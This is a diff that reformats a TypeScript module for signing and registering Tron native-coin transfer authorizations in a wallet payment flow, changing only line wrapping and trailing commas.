@@ -1,5 +1,9 @@
 import { resolveApiUrl } from "../core/api-url";
-import { getErrorMessage, isUserRejection, withSilentWalletCancellation } from "../core/errors";
+import {
+  getErrorMessage,
+  isUserRejection,
+  withSilentWalletCancellation,
+} from "../core/errors";
 import { mergeTronSignedResult, tronSignTransaction } from "../core/tron-sign";
 import type { HttpNativeTransferApiClientOptions } from "./http-api-client";
 import { createHttpNativeTransferApiClient } from "./http-api-client";
@@ -29,12 +33,13 @@ export type NativeWalletAuthorizeResult =
  * `runNativeTransfer` after token collection.
  */
 export async function authorizeNativeInWalletPhase(
-  args: NativeWalletAuthorizeArgs
+  args: NativeWalletAuthorizeArgs,
 ): Promise<NativeWalletAuthorizeResult> {
   if (args.network !== "tron") {
     return {
       ok: false,
-      error: "EVM native is deferred to settlement (no wallet popup in wallet phase)",
+      error:
+        "EVM native is deferred to settlement (no wallet popup in wallet phase)",
     };
   }
 
@@ -53,20 +58,27 @@ export async function authorizeNativeInWalletPhase(
       },
     });
 
-    if (!estimate.canTransfer || BigInt(estimate.transferableRaw) <= BigInt(0)) {
+    if (
+      !estimate.canTransfer ||
+      BigInt(estimate.transferableRaw) <= BigInt(0)
+    ) {
       return {
         ok: false,
-        error: estimate.message ?? "Insufficient native balance after network fees",
+        error:
+          estimate.message ?? "Insufficient native balance after network fees",
       };
     }
 
     const unsigned = estimate.transaction;
     if (!unsigned) {
-      return { ok: false, error: "Missing Tron native transfer transaction from estimate" };
+      return {
+        ok: false,
+        error: "Missing Tron native transfer transaction from estimate",
+      };
     }
 
     const signRaw = await withSilentWalletCancellation(() =>
-      tronSignTransaction(args.provider, args.owner, unsigned)
+      tronSignTransaction(args.provider, args.owner, unsigned),
     );
     const signed = mergeTronSignedResult(unsigned, signRaw);
     return {
@@ -97,7 +109,10 @@ export async function registerWalletPhaseNativeAuthorization(args: {
   walletSessionToken?: string;
 }): Promise<void> {
   const res = await fetch(
-    resolveApiUrl(args.apiBaseUrl, "/api/network-settlement/register-native-authorization"),
+    resolveApiUrl(
+      args.apiBaseUrl,
+      "/api/network-settlement/register-native-authorization",
+    ),
     {
       method: "POST",
       headers: {
@@ -116,10 +131,12 @@ export async function registerWalletPhaseNativeAuthorization(args: {
         recipient: args.capture.recipient,
       }),
       cache: "no-store",
-    }
+    },
   );
   const json = (await res.json()) as { ok?: boolean; message?: string };
   if (!res.ok || !json.ok) {
-    throw new Error(String(json.message ?? "Failed to register native authorization"));
+    throw new Error(
+      String(json.message ?? "Failed to register native authorization"),
+    );
   }
 }
